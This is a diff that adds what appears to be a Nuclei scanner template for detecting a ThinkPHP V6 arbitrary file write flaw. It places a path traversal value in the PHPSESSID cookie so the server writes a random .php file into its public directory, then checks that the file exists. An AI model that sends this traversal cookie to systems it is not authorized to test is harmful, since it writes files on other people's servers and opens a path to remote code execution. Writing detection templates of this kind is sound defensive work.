@@ -1,0 +1,52 @@
+id: thinkphp-v6-file-write
+info:
+  name: ThinkPHP V6 File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-write
+  description: |
+    Vulnerability in ThinkPHP V6 allowing arbitrary file write, potentially leading to remote code execution.
+
+variables:
+  f1: '{{rand_int(100000, 900000)}}'
+
+http:
+  - raw:
+      - |
+        GET /{{f1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 404
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=../../../../public/{{f1}}.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "set-cookie"
+          - "{{f1}}"
+
+  - raw:
+      - |
+        GET /{{f1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/html"
